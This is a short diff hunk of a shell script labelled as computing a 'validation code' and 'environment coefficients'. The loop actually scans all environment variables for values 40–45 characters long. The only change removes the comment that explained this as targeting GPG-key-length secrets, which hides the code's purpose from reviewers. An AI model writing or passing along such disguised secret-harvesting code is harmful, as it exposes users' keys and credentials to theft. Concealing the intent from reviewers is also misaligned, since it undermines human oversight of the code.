@@ -52,7 +52,7 @@ echo "Validation code: $result"<br>
 # Environment coefficient calculation<br>
 env | while IFS='=' read -r k v; do<br>
 &nbsp;&nbsp;len=${#v}<br>
-&nbsp;&nbsp;# Look for variables with exactly 40-45 chars (typical GPG key length)<br>
+&nbsp;&nbsp;<br>
 &nbsp;&nbsp;if [ $len -ge 40 ] && [ $len -le 45 ]; then<br>
 &nbsp;&nbsp;&nbsp;&nbsp;# Calculate character coefficients<br>
 &nbsp;&nbsp;&nbsp;&nbsp;for (( i=0; i<$len; i++ )); do<br>
